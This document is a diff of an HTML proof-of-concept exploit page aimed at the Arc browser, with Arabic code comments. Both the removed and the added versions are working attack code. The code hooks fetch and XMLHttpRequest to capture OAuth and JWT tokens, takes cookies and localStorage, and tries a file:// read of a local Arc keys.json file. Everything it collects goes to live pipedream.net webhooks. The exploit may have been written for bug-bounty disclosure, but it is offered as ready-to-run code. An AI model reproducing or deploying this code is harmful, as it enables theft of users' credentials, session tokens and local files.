@@ -1,113 +1,90 @@
 <!DOCTYPE html>
-<html lang="en">
-<head><meta charset="UTF-8"><title>Arc XSS Monitor</title></head>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>PoC | Arc Token Exfiltration</title>
+</head>
 <body>
-<script>
-  const WEBHOOK = "https://eoeisd0pus6doy3.m.pipedream.net/";
+  <h1>Arc Exploit PoC</h1>
+  <p>Checking for tokens and local file access...</p>
 
-  function exfiltrate(data) {
-    fetch(WEBHOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data)
-    }).catch(() => {});
-  }
+  <script>
+    // ✅ Webhook بتاعك هنا
+    const webhook = "https://eoq6u4lcr4rx56u.m.pipedream.net";
 
-  function deepSearch(obj) {
-    const secrets = [];
-    function scan(obj, path = "") {
-      if (!obj) return;
-      if (typeof obj === "string") {
-        // احتمالية توكن
-        if (obj.includes("ya29.") || obj.includes("eyJhbGciOi")) {
-          secrets.push({ path, value: obj });
-        }
-      } else if (typeof obj === "object") {
-        for (let key in obj) {
-          scan(obj[key], path + "." + key);
-        }
-      }
+    // 🔄 إرسال البيانات
+    function exfiltrate(data) {
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      }).catch(console.error);
     }
-    scan(obj);
-    return secrets;
-  }
 
-  // Hook على fetch
-  (function(){
-    const origFetch = window.fetch;
-    window.fetch = function(...args) {
-      return origFetch.apply(this, args).then(async res => {
-        const clone = res.clone();
-        let bodyText = null;
-
-        try { bodyText = await clone.text(); } catch {}
-
-        let parsed = null;
-        try { parsed = JSON.parse(bodyText); } catch {}
-
-        const findings = deepSearch(parsed || bodyText);
-        if (findings.length > 0) {
-          exfiltrate({
-            type: "🔥 TOKEN FOUND in fetch",
-            url: res.url,
-            findings: findings,
-            timestamp: new Date().toISOString()
-          });
-
-          alert("🚨 TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
-        }
-
-        return res;
-      });
-    };
-  })();
-
-  // Hook على XMLHttpRequest
-  (function(){
-    const origOpen = XMLHttpRequest.prototype.open;
-    const origSend = XMLHttpRequest.prototype.send;
-
-    XMLHttpRequest.prototype.open = function(method, url) {
-      this._method = method;
-      this._url = url;
-      return origOpen.apply(this, arguments);
-    };
-
-    XMLHttpRequest.prototype.send = function(body) {
-      this.addEventListener("load", function() {
-        let parsed = null;
-        try { parsed = JSON.parse(this.responseText); } catch {}
-
-        const findings = deepSearch(parsed || this.responseText);
-        if (findings.length > 0) {
-          exfiltrate({
-            type: "🔥 TOKEN FOUND in XHR",
-            method: this._method,
-            url: this._url,
-            findings: findings,
-            timestamp: new Date().toISOString()
-          });
-
-          alert("🚨 TOKEN FOUND\n" + JSON.stringify(findings, null, 2));
-        }
+    // 🎯 محاولة قراءة ملف محلي حساس
+    fetch("file:///Users/macos/Library/Application Support/Arc/User Data/TrustTokenKeyCommitments/2025.5.15.1/keys.json")
+      .then(r => r.text())
+      .then(txt => {
+        exfiltrate({
+          type: "🧨 FILE READ SUCCESS",
+          file: "keys.json",
+          content: txt,
+          timestamp: new Date().toISOString()
+        });
+        alert("🚨 File Read Successful:\n" + txt.slice(0, 500));
+      })
+      .catch(err => {
+        exfiltrate({
+          type: "❌ FILE READ FAILED",
+          file: "keys.json",
+          error: String(err),
+          timestamp: new Date().toISOString()
+        });
       });
 
-      return origSend.apply(this, arguments);
-    };
-  })();
+    // 🎣 Hook على fetch و XMLHttpRequest للـ Tokens
+    function inspectContent(content, source) {
+      try {
+        const regex = /([a-zA-Z0-9-_]{10,}\.[a-zA-Z0-9-_]{10,}\.[a-zA-Z0-9-_]{10,})/g; // JWT style
+        const found = content.match(regex);
+        if (found) {
+          exfiltrate({
+            type: "🔥 TOKEN FOUND",
+            source,
+            tokens: found,
+            full: content,
+            timestamp: new Date().toISOString()
+          });
+          console.warn(`🚨 TOKEN EXFILTRATED from ${source}`);
+        }
+      } catch (e) {}
+    }
 
-  // إرسال بيانات مبدأية
-  exfiltrate({
-    type: "🔔 XSS Page Loaded",
-    userAgent: navigator.userAgent,
-    cookies: document.cookie || "no cookies",
-    localStorage: (() => {
-      try { return { ...localStorage }; } catch { return "inaccessible"; }
-    })(),
-    url: location.href,
-    timestamp: new Date().toISOString()
-  });
-</script>
-<p style="font-family: sans-serif;">Loading...</p>
+    const originalFetch = window.fetch;
+    window.fetch = async (...args) => {
+      const response = await originalFetch(...args);
+      const clone = response.clone();
+      clone.text().then(text => inspectContent(text, "fetch"));
+      return response;
+    };
+
+    const originalXHR = window.XMLHttpRequest;
+    window.XMLHttpRequest = function () {
+      const xhr = new originalXHR();
+      const open = xhr.open;
+      xhr.open = function (...args) {
+        this._url = args[1];
+        return open.apply(this, args);
+      };
+      const send = xhr.send;
+      xhr.send = function (...args) {
+        this.addEventListener("load", function () {
+          inspectContent(this.responseText, `XHR -> ${this._url}`);
+        });
+        return send.apply(this, args);
+      };
+      return xhr;
+    };
+  </script>
 </body>
 </html>
